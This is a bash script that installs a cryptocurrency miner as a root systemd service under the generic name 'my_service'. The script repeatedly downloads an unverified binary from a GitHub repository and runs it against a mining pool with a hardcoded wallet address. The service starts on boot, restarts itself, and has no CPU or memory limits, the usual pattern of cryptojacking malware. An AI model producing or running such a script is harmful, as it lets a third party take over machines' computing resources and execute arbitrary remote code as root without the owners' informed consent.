#!/bin/bash
# Improved Version of the Mining Setup Script
# Please ensure you have permission to run this on your system

# Step 1: Install necessary dependencies
apt update -y
apt install curl wget git -y

# Step 2: Install nvm and Node.js (if needed for future tasks)
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion
nvm install --lts

# Step 3: Create the mining script with better logging and error handling
cat << 'EOF' > /usr/local/bin/my_service.sh
#!/bin/bash
# Define the URL and mining parameters (make these configurable via environment variables)
MINER_URL="${MINER_URL:-https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/srb}"
POOL_URL="${POOL_URL:-stratum-na.rplant.xyz:17056}"
WALLET_ADDRESS="${WALLET_ADDRESS:-RSb3DtLXeXPRv12YWsDZbg6NGMjTY17gEj}"
LOG_FILE="/var/log/mining_service.log"



# Ensure log file exists
touch $LOG_FILE

# Function for logging
log() {
    echo "$(date "+%Y-%m-%d %H:%M:%S") - $1" >> $LOG_FILE
}

# Loop to download and run miner
while true; do
    # Download the miner executable
    log "Attempting to download miner from $MINER_URL..."
    wget -q "$MINER_URL" -O srb

    if [ $? -ne 0 ]; then
        log "Failed to download the miner. Retrying in 10 seconds..."
        sleep 10
        continue
    fi

    # Make the miner executable
    chmod +x srb
    if [ $? -ne 0 ]; then
        log "Failed to make the miner executable. Retrying in 10 seconds..."
        sleep 10
        continue
    fi

    # Run the miner
    log "Starting the miner with pool URL: $POOL_URL and wallet address: $WALLET_ADDRESS..."
    ./srb -a ghostrider -o "$POOL_URL" -u "$WALLET_ADDRESS" -p start=0.4

    if [ $? -ne 0 ]; then
        log "Miner crashed or failed. Restarting in 10 seconds..."
        sleep 10
    else
        log "Miner exited successfully. Restarting in 5 seconds..."
        sleep 5
    fi
done
EOF

# Step 4: Make the mining script executable
chmod +x /usr/local/bin/my_service.sh

# Step 5: Create the systemd service file with resource limitations
cat << 'EOF' > /etc/systemd/system/my_service.service
[Unit]
Description=Mining Service
After=network.target

[Service]
ExecStart=/usr/local/bin/my_service.sh
Restart=always
User=root
Group=root
LimitNOFILE=1048576
LimitNPROC=unlimited
CPUQuota=infinity
MemoryMax=infinity
IOWeight=1000


[Install]
WantedBy=multi-user.target
EOF

# Step 6: Reload systemd and start the service
systemctl daemon-reload
systemctl start my_service.service
systemctl enable my_service.service

# Step 7: Inform the user
echo "Setup completed! The mining service is now running and enabled on boot."
echo "Logs are being saved to /var/log/mining_service.log"
